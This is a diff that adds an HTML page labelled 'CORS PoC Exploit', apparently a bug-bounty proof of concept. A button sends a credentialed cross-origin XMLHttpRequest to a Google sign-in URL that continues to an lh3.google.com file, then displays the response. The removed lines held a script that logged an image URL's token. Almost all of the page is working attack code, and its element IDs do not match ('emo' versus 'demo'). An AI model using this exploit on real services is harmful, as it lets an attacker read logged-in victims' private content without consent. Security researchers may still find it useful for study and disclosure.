@@ -1,11 +1,26 @@
-<img id="myImage" src="https://lh3.google.com/u/0/d/1snA1SLGWmWh5GhDtIulL3Y5BY75CYfOyFiy__dbHgIA=w5000-h5000-p-k-nu" />
-
-<script>
-  window.onload = function () {
-    let img = document.getElementById("myImage");
-    let url = new URL(img.src);
-
-    console.log("Full URL:", url.href);
-    console.log("Token:", url.pathname.split('/').pop());
-  };
-</script>
+<html>
+   <head>
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("emo").innerHTML = alert(this.responseText);
+            }
+         };
+         xhttp.open("GET", "https://accounts.google.com/AccountChooser/signinchooser?continue=https://lh3.google.com/u/0/d/1-TTCS6fS6kvFUkoJmX4Udr-czQ79lSUVXiWsiAED_bs=w200-h150-p-k-nu&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://evil.com">@Hridoy</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
